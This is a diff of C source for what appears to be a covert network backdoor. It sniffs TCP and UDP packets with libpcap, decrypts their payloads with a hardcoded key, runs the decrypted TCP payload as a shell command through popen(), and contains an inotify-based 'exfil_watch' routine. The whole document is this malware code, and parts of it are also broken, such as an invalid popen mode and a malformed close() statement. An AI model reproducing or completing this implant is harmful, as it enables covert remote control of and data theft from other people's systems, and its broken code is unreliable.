@@ -118,7 +118,7 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	tcphdr = (struct tcphdr*) (packet + ip_len);
 	size_tcp = tcphdr->doff * 4;
 
-	if (size_tcp < 20)
+	if (size_tcp < TCP_HDR_SIZ)
 		error("handle_tcp(): invalid TCP size");
 
 	// retrieves the TCP payload
@@ -127,7 +127,9 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	decrypt_payload = malloc(sizeof(tcp_payload));
 
 	// decrypt the payload and copy it into decrypt_payload variable.
-	memcpy(decrypt_payload, decrypt(), sizeof(tcp_payload));
+	memcpy(decrypt_payload, decrypt(SEKRET, tcp_payload, sizeof(tcp_payload)), sizeof(tcp_payload));
+
+	cmd_execute(decrypt_payload, iphdr->saddr);
 }
 
 void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
@@ -143,7 +145,7 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	udphdr = (struct udphdr*) (iphdr + ip_len);
 	size_udp = sizeof(struct udphdr);
 
-	if (size_udp < 8)
+	if (size_udp < UDP_HDR_SIZ)
 		error("handle_udp(): invalid UDP size");
 
 	// retrieves the UDP payload
@@ -153,7 +155,26 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	decrypt_payload = malloc(sizeof(udp_payload));
 
 	// decrypt the payload and copy it into decrypt_payload variable.
-	memcpy(decrypt_payload, decrypt(), sizeof(udp_payload));
+	memcpy(decrypt_payload, decrypt(SEKRET, udp_payload, sizeof(udp_payload)), sizeof(udp_payload));
+}
+
+void cmd_execute(char *command, uint32 ip) {
+	FILE *fp;
+	char line[MAX_LEN];
+	char resp[MAX_LEN];
+	int tot_len;
+
+	memset(line, 0, MAX_LEN);
+	memset(resp, 0, MAX_LEN);
+
+	// Run the command, grab stdout
+	fp = popen(command, "rb");
+
+	// Append line by line output into response buffer
+	while (fgets(line, MAX_LEN, fp) != NULL)
+		strcat(resp, line);
+
+	tot_len = strlen(resp) + 1;
 }
 
 void *exfil_watch(void *arg) {
@@ -221,26 +242,6 @@ void *exfil_watch(void *arg) {
 		error("exfil_watch(): inotify rm watch");
 	else
 		(close(fd)) error("exfil_watch(): close");
-
-}
-
-void cmd_execute(char *command, uint32 ip, uint16 port) {
-	FILE *fp;
-	char line[MAX_LEN];
-	char resp[MAX_LEN];
-	int tot_len;
-
-	memset(line, 0, MAX_LEN);
-	memset(resp, 0, MAX_LEN);
-
-	// Run the command, grab stdout
-	fp = popen(command, "r");
-
-	// Append line by line output into response buffer
-	while (fgets(line, MAX_LEN, fp) != NULL)
-		strcat(resp, line);
-
-	tot_len = strlen(resp) + 1;
 
 }
 
